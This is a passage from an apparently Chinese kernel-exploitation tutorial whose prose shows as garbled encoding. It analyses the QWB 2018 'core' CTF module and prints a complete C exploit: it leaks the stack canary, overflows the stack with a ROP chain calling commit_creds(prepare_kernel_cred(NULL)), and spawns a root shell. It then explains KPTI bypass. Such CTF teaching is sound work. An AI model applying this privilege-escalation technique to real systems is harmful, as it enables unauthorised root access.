<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">â†“   swapgs<br>    iretq<br>    user_shell_addr<br>    user_cs<br>    user_eflags <span class="hljs-regexp">//</span><span class="hljs-number">64</span>bit user_rflags<br>    user_sp<br>    user_ss<br></code></pre></td></tr></table></figure>

<blockquote>
<p>å†…æ ¸ROPå’Œç”¨æˆ·æ€çš„ROPæœ¬è´¨ä¸Šæ²¡æœ‰å¤ªå¤§åŒºåˆ«ï¼Œç»†èŠ‚ä¾¿ä¸åœ¨æ­¤èµ˜å™äº†</p>
<blockquote>
<p><del>ä»€ä¹ˆï¼Ÿä½ è¯´ä½ â‘§ä¼š ROP ï¼Ÿé‚£ä½ çœ‹ä¸ªğŸ”¨kernel pwn</del></p>
<p>ğŸ‘´æ‚ŸğŸŒ¶ï¼**å¸¦å­¦çš„å¸¦æ‰‹å­pwneråœ¨VNCTF2021å‘Šè¯‰ğŸ‘´ ROP äº‹ä¸€ä¸ªå¯„å­˜å™¨ï¼</p>
</blockquote>
</blockquote>
<h2 id="ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2018-core"><a href="#ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2018-core" class="headerlink" title="ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2018 - core"></a>ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2018 - core</h2><blockquote>
<p>ä¾ç„¶æ˜¯ååˆ†ç»å…¸çš„kernel pwnå…¥é—¨é¢˜</p>
<p><a href="/download/qwb2018/pwn/core.7z" title="ç‚¹æ­¤ä¸‹è½½åŸé¢˜é™„ä»¶">ç‚¹å‡»ä¸‹è½½-core.7z</a></p>
</blockquote>
<p>é¦–å…ˆæŸ¥çœ‹å¯åŠ¨è„šæœ¬<code>start.sh</code>ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">qemu-system-x86_64 \<br>-m 128M \<br>-kernel ./bzImage \<br>-initrd  ./core.cpio \<br>-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \<br>-s  \<br>-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \<br>-nographic  \<br></code></pre></td></tr></table></figure>

<ul>
<li>å¼€å¯äº†KASLRä¿æŠ¤</li>
</ul>
<p>è§£å‹æ–‡ä»¶ç³»ç»Ÿï¼ŒæŸ¥çœ‹<code>init</code>æ–‡ä»¶ï¼š</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br>mount -t proc proc /proc<br>mount -t sysfs sysfs /sys<br>mount -t devtmpfs none /dev<br>/sbin/mdev -s<br><span class="hljs-built_in">mkdir</span> -p /dev/pts<br>mount -vt devpts -o gid=4,mode=620 none /dev/pts<br><span class="hljs-built_in">chmod</span> 666 /dev/ptmx<br><span class="hljs-built_in">cat</span> /proc/kallsyms &gt; /tmp/kallsyms<br><span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict<br><span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict<br>ifconfig eth0 up<br>udhcpc -i eth0<br>ifconfig eth0 10.0.2.15 netmask 255.255.255.0<br>route add default gw 10.0.2.2 <br>insmod /core.ko<br><br>poweroff -d 120 -f &amp;<br>setsid /bin/cttyhack setuidgid 1000 /bin/sh<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;sh end!\n&#x27;</span><br>umount /proc<br>umount /sys<br><br>poweroff -d 0  -f<br></code></pre></td></tr></table></figure>

<ul>
<li>å¼€å§‹æ—¶å†…æ ¸ç¬¦å·è¡¨è¢«å¤åˆ¶äº†ä¸€ä»½åˆ°<code>/tmp/kalsyms</code>ä¸­ï¼Œåˆ©ç”¨è¿™ä¸ªæˆ‘ä»¬å¯ä»¥è·å¾—å†…æ ¸ä¸­æ‰€æœ‰å‡½æ•°çš„åœ°å€</li>
<li>ä¸å‡ºæ„å¤–çš„è¯<code>core.ko</code>å°±æ˜¯å­˜åœ¨æ¼æ´çš„å†…æ ¸æ¨¡å—</li>
<li>æ”¹å˜æƒé™å‰è®¾ç½®äº†å®šæ—¶å…³æœºï¼Œè°ƒè¯•çš„æ—¶å€™å¯ä»¥æŠŠè¿™ä¸ªè¯­å¥å…ˆåˆ æ‰</li>
</ul>
<h3 id="â‘ -åˆ†æ"><a href="#â‘ -åˆ†æ" class="headerlink" title="â‘  åˆ†æ"></a>â‘  åˆ†æ</h3><p>æƒ¯ä¾‹çš„<code>checksec</code>ä¸€ä¸‹ï¼Œå¼€äº†NXå’Œcanary</p>
<p><img src="https://i.loli.net/2021/03/04/Nrpe675FRtBP4ju.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼Œç¬¦å·è¡¨æ²¡æŠ ï¼Œå¾ˆå¼€å¿ƒï¼ˆ</p>
<p>åˆå§‹åŒ–å‡½æ•°ä¸­åˆ›å»ºäº†ä¸€ä¸ªè¿›ç¨‹èŠ‚ç‚¹æ–‡ä»¶<code>/proc/core</code>ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬åç»­ä¸å†…æ ¸æ¨¡å—é—´é€šä¿¡çš„åª’ä»‹</p>
<p><img src="https://i.loli.net/2021/03/04/zocOw75hPrBIZkH.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ç®€å•åˆ†æè‡ªå®šä¹‰çš„fopç»“æ„ä½“<code>core_fops</code>ï¼Œå‘ç°åªè‡ªå®šä¹‰äº†ä¸‰ä¸ªå›è°ƒå‡½æ•°</p>
<p><img src="https://i.loli.net/2021/03/04/JHyemlLTK5G34E2.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p><img src="https://i.loli.net/2021/03/04/TvhVpN86dmfzHoW.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p><img src="https://i.loli.net/2021/03/04/lDBmUK5fia3bnHL.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>å…¶ä¸­<code>core_release</code>ä»…ä¸ºæ‰“å°åŠŸèƒ½ï¼Œå°±ä¸åœ¨æ­¤æ”¾å‡ºäº†</p>
<p>è€Œ<code>core_write</code>çš„åŠŸèƒ½ä¸»è¦æ˜¯å…è®¸ç”¨æˆ·å‘bssæ®µä¸Šå†™å…¥æœ€å¤š<code>0x800</code>å­—èŠ‚çš„å†…å®¹</p>
<p><img src="https://i.loli.net/2021/03/08/bHKGQyTV7xMB5jS.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>åœ¨<code>core_ioctl</code>ä¸­å…è®¸æˆ‘ä»¬è°ƒç”¨<code>core_read</code>å’Œ<code>core_copy_func</code>è¿™ä¸¤ä¸ªå‡½æ•°ï¼Œä»¥åŠè®¾ç½®å…¨å±€å˜é‡<code>off</code>çš„å€¼</p>
<p><img src="https://i.loli.net/2021/03/08/faCDRKvMSN64eux.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>åœ¨<code>core_read</code>å‡½æ•°ä¸­å…è®¸æˆ‘ä»¬ä»æ ˆä¸Šè¯»å–æ•°æ®ï¼Œç”±äº<code>off</code>å˜é‡çš„å€¼å¯ä»¥ç”±æˆ‘ä»¬æ§åˆ¶ï¼Œæ•…æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¯¥å‡½æ•°æ³„éœ²æ ˆä¸Šæ•°æ®ï¼ŒåŒ…æ‹¬<code>canary</code></p>
<p><img src="https://i.loli.net/2021/03/08/5ITzXBM3gJ2YEch.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h3 id="â‘¡-æ¼æ´åˆ©ç”¨ï¼šKernel-ROP"><a href="#â‘¡-æ¼æ´åˆ©ç”¨ï¼šKernel-ROP" class="headerlink" title="â‘¡ æ¼æ´åˆ©ç”¨ï¼šKernel ROP"></a>â‘¡ æ¼æ´åˆ©ç”¨ï¼šKernel ROP</h3><p>åœ¨<code>core_copy_func</code>ä¸­å°†ä¼šæ‹·è´bssæ®µä¸Šå†…å®¹åˆ°æ ˆä¸Šï¼Œç”±äºå…¶æ‹·è´æ—¶ä½¿ç”¨ä½16å­—èŠ‚ä½œä¸ºåˆ¤æ–­é•¿åº¦ï¼Œè‹¥æ˜¯æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªæ°å½“çš„è´Ÿæ•°ï¼Œä¾¿èƒ½æ‹·è´æœ€å¤š0xffffå­—èŠ‚çš„æ•°æ®åˆ°æ ˆä¸Š</p>
<p>æ•…<strong>å­˜åœ¨æ ˆæº¢å‡ºï¼Œä¸”æº¢å‡ºæ•°æ®å¯æ§</strong></p>
<p><img src="https://i.loli.net/2021/03/08/2RYiWgwhFbpq7VC.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>é‚£ä¹ˆæˆ‘ä»¬ä¾¿èƒ½å¤Ÿåˆ©ç”¨æ ˆæº¢å‡ºåœ¨æ ˆä¸Šæ„é€ ROP chainä»¥ææƒ</p>
<p>è€Œcanaryçš„å€¼å¯ä»¥é€šè¿‡ioctlæä¾›çš„åŠŸèƒ½ä»¥æ³„éœ²ï¼Œæ­¤å‰å†…æ ¸ç¬¦å·è¡¨åˆå·²ç»è¢«æ‹·è´åˆ°äº†<code>/tmp/kallsyms</code>ä¸‹ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥ä»ä¸­è¯»å–å„ä¸ªå†…æ ¸ç¬¦å·çš„åœ°å€</p>
<p>åªè¦æˆ‘ä»¬èƒ½å¤Ÿåœ¨å†…æ ¸ç©ºé—´æ‰§è¡Œ<code>commit_cred(prepare_kernel_cred(NULL))</code>ï¼Œé‚£ä¹ˆå°±èƒ½å¤Ÿå°†è¿›ç¨‹çš„æƒé™æå‡åˆ°<code>root</code></p>
<p>è‡³äºgadgetå¯ä»¥ç›´æ¥ä½¿ç”¨ROPgadgetæˆ–è€…ropperå¯¹ç€vmlinuxé•œåƒè·‘ä¸€è½®ï¼Œè¿™é‡Œä¾¿ä¸å†èµ˜å™</p>
<blockquote>
<p>ä¸æ˜åŸå› ï¼Œç¬”è€…çš„ROPgadgetæ²¡æ³•æ‰¾åˆ°<code>iretq</code>ï¼Œåªå¥½ä½¿ç”¨ pwntools æ¥æœ</p>
<p><img src="https://s2.loli.net/2022/05/18/cSokGuy3fHxOKhm.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
</blockquote>
<p>è°ƒè¯•çš„æ—¶å€™æˆ‘ä»¬å¯ä»¥å…ˆæŠŠkaslrå…³æ‰ï¼Œè·å–æ²¡æœ‰åç§»çš„å‡½æ•°åœ°å€ï¼Œåç»­å†é€šè¿‡è¯¥å€¼è®¡ç®—åç§»</p>
<p><img src="https://i.loli.net/2021/03/09/qcQBySIFpu9X1Hl.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h3 id="â‘¢-exploit"><a href="#â‘¢-exploit" class="headerlink" title="â‘¢ exploit"></a>â‘¢ exploit</h3><p>æˆ‘ä»¬è¿™é‡Œé€‰æ‹©æ‰§è¡Œ<code>commit_creds(prepare_kernel_cred(NULL))</code>ä»¥ææƒ</p>
<p>ç”±äºæ˜¯å†…æ ¸æ€çš„ropï¼Œæ•…æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨è¿”å›ç”¨æˆ·æ€æ‰§è¡Œ<code>/bin/sh</code>ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦æ¨¡æ‹Ÿç”±ç”¨æˆ·æ€è¿›å…¥å†…æ ¸æ€å†è¿”å›ç”¨æˆ·æ€çš„è¿‡ç¨‹</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff81000b2f</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDX_RET 0xffffffff810a0f49</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RCX_RET 0xffffffff81021e53</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_POPFQ_RET 0xffffffff81a012da</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>  IRETQ 0xffffffff81050ac2</span><br><br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-number">0</span>, prepare_kernel_cred = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pushf;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pop user_rflags;&quot;</span></span><br><span class="hljs-params">    )</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(getuid()) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m&quot;</span><br>         <span class="hljs-string">&quot;[+] Successful to get the root. Execve root shell now...&quot;</span><br>         <span class="hljs-string">&quot;\033[0m&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> * buf)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889B</span>, buf);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_off_val</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> off)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889C</span>, off);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_copy</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> nbytes)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889A</span>, nbytes);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv)</span><br>&#123;<br>    FILE *ksyms_file;<br>    <span class="hljs-type">int</span> fd;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x50</span>], type[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-type">size_t</span> addr;<br>    <span class="hljs-type">size_t</span> offset, canary;<br>    <span class="hljs-type">size_t</span> rop_chain[<span class="hljs-number">0x100</span>], i;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m&quot;</span>);<br>    save_status();<br><br>    fd = open(<span class="hljs-string">&quot;/proc/core&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span>(fd &lt;<span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the /proc/core !\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//get the addr</span><br>    ksyms_file = fopen(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(ksyms_file == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">fscanf</span>(ksyms_file, <span class="hljs-string">&quot;%lx%s%s&quot;</span>, &amp;addr, type, buf)) &#123;<br>        <span class="hljs-keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!commit_creds &amp;&amp; !<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;commit_creds&quot;</span>)) &#123;<br>            commit_creds = addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m&quot;</span><br>                   <span class="hljs-string">&quot;[+] Successful to get the addr of commit_cread:&quot;</span><br>        	   <span class="hljs-string">&quot;\033[0m%lx\n&quot;</span>, commit_creds);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>)) &#123;<br>            prepare_kernel_cred = addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m&quot;</span><br>                   <span class="hljs-string">&quot;[+] Successful to get the addr of prepare_kernel_cred:&quot;</span><br>        	   <span class="hljs-string">&quot;\033[0m%lx\n&quot;</span>, prepare_kernel_cred);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>    &#125;<br><br>    offset = commit_creds - <span class="hljs-number">0xffffffff8109c8e0</span>;<br><br>    <span class="hljs-comment">// get the canary</span><br>    set_off_val(fd, <span class="hljs-number">64</span>);<br>    core_read(fd, buf);<br>    canary = ((<span class="hljs-type">size_t</span> *)buf)[<span class="hljs-number">0</span>];<br><br>    <span class="hljs-comment">//construct the ropchain</span><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>;i++) &#123;<br>        rop_chain[i] = canary;<br>    &#125;<br>    rop_chain[i++] = POP_RDI_RET + offset;<br>    rop_chain[i++] = <span class="hljs-number">0</span>;<br>    rop_chain[i++] = prepare_kernel_cred;<br>    rop_chain[i++] = POP_RDX_RET + offset;<br>    rop_chain[i++] = POP_RCX_RET + offset; <span class="hljs-comment">// clear useless stack data</span><br>    rop_chain[i++] = MOV_RDI_RAX_CALL_RDX + offset;<br>    rop_chain[i++] = commit_creds;<br>    rop_chain[i++] = SWAPGS_POPFQ_RET + offset;<br>    rop_chain[i++] = <span class="hljs-number">0</span>;<br>    rop_chain[i++] = IRETQ + offset;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)get_root_shell;<br>    rop_chain[i++] = user_cs;<br>    rop_chain[i++] = user_rflags;<br>    rop_chain[i++] = user_sp;<br>    rop_chain[i++] = user_ss;<br><br>    write(fd, rop_chain, <span class="hljs-number">0x800</span>);<br>    core_copy(fd, <span class="hljs-number">0xffffffffffff0000</span> | (<span class="hljs-number">0x100</span>));<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ç¼–è¯‘æŒ‡ä»¤ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">gcc ./exploit.c -o exploit -static -masm=intel</span><br></code></pre></td></tr></table></figure>

<p>æœ¬åœ°è°ƒè¯•çš„è¯é‡æ–°æ‰“åŒ…å³å¯</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">find . | cpio -o -H newc &gt; ../core.cpio</span><br></code></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯è·å¾—root shell</p>
<p><img src="https://i.loli.net/2021/03/09/4InLOlstS3UZiPh.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="è¿”å›ç”¨æˆ·æ€-with-KPTI-bypass"><a href="#è¿”å›ç”¨æˆ·æ€-with-KPTI-bypass" class="headerlink" title="è¿”å›ç”¨æˆ·æ€ with KPTI bypass"></a>è¿”å›ç”¨æˆ·æ€ with KPTI bypass</h2><p>å¯¹äºå¼€å¯äº† KPTIï¼ˆå†…æ ¸é¡µè¡¨éš”ç¦»ï¼‰ï¼Œæˆ‘ä»¬<strong>ä¸èƒ½åƒä¹‹å‰é‚£æ ·ç›´æ¥ swapgs ; iret è¿”å›ç”¨æˆ·æ€</strong>ï¼Œè€Œæ˜¯åœ¨è¿”å›ç”¨æˆ·æ€ä¹‹å‰è¿˜<strong>éœ€è¦å°†ç”¨æˆ·è¿›ç¨‹çš„é¡µè¡¨ç»™åˆ‡æ¢å›æ¥</strong></p>
<p>ä¼—æ‰€å‘¨çŸ¥ Linux é‡‡ç”¨<strong>å››çº§é¡µè¡¨</strong>ç»“æ„ï¼ˆPGD-&gt;PUD-&gt;PMD-&gt;PTEï¼‰ï¼Œè€Œ CR3 æ§åˆ¶å¯„å­˜å™¨ç”¨ä»¥å­˜å‚¨å½“å‰çš„ PGD çš„åœ°å€ï¼Œå› æ­¤åœ¨å¼€å¯ KPTI çš„æƒ…å†µä¸‹ç”¨æˆ·æ€ä¸å†…æ ¸æ€ä¹‹é—´çš„åˆ‡æ¢ä¾¿æ¶‰åŠåˆ° CR3 çš„åˆ‡æ¢ï¼Œä¸ºäº†æé«˜åˆ‡æ¢çš„é€Ÿåº¦ï¼Œå†…æ ¸å°†å†…æ ¸ç©ºé—´çš„ PGD ä¸ç”¨æˆ·ç©ºé—´çš„ PGD ä¸¤å¼ é¡µå…¨å±€ç›®å½•è¡¨æ”¾åœ¨ä¸€æ®µè¿ç»­çš„å†…å­˜ä¸­ï¼ˆä¸¤å¼ è¡¨ï¼Œä¸€å¼ ä¸€é¡µ4kï¼Œæ€»è®¡8kï¼Œå†…æ ¸ç©ºé—´çš„åœ¨ä½åœ°å€ï¼Œç”¨æˆ·ç©ºé—´çš„åœ¨é«˜åœ°å€ï¼‰ï¼Œè¿™æ ·<strong>åªéœ€è¦å°† CR3 çš„ç¬¬ 13 ä½å–åä¾¿èƒ½å®Œæˆé¡µè¡¨åˆ‡æ¢çš„æ“ä½œ</strong></p>
<p><img src="https://i.loli.net/2021/09/10/Rm8Ti9MpVUZ7fPK.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>éœ€è¦è¿›è¡Œè¯´æ˜çš„æ˜¯ï¼Œ<strong>åœ¨è¿™ä¸¤å¼ é¡µè¡¨ä¸Šéƒ½æœ‰ç€å¯¹ç”¨æˆ·å†…å­˜ç©ºé—´çš„å®Œæ•´æ˜ å°„ï¼Œä½†åœ¨ç”¨æˆ·é¡µè¡¨ä¸­åªæ˜ å°„äº†å°‘é‡çš„å†…æ ¸ä»£ç ï¼ˆä¾‹å¦‚ç³»ç»Ÿè°ƒç”¨å…¥å£ç‚¹ã€ä¸­æ–­å¤„ç†ç­‰ï¼‰ï¼Œè€Œåªæœ‰åœ¨å†…æ ¸é¡µè¡¨ä¸­æ‰æœ‰ç€å¯¹å†…æ ¸å†…å­˜ç©ºé—´çš„å®Œæ•´æ˜ å°„</strong>ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå·¦ä¾§æ˜¯æœªå¼€å¯ KPTI åçš„é¡µè¡¨å¸ƒå±€ï¼Œå³ä¾§æ˜¯å¼€å¯äº† KPTI åçš„é¡µè¡¨å¸ƒå±€</p>
<p><strong>KPTI åŒæ—¶è¿˜ä»¤å†…æ ¸é¡µè¡¨ä¸­ç”¨æˆ·åœ°å€ç©ºé—´éƒ¨åˆ†å¯¹åº”çš„é¡µé¡¶çº§è¡¨é¡¹ä¸å†æ‹¥æœ‰æ‰§è¡Œæƒé™ï¼ˆNXï¼‰ï¼Œè¿™ä½¿å¾— ret2usr å½»åº•æˆä¸ºè¿‡å»å¼</strong></p>
<blockquote>
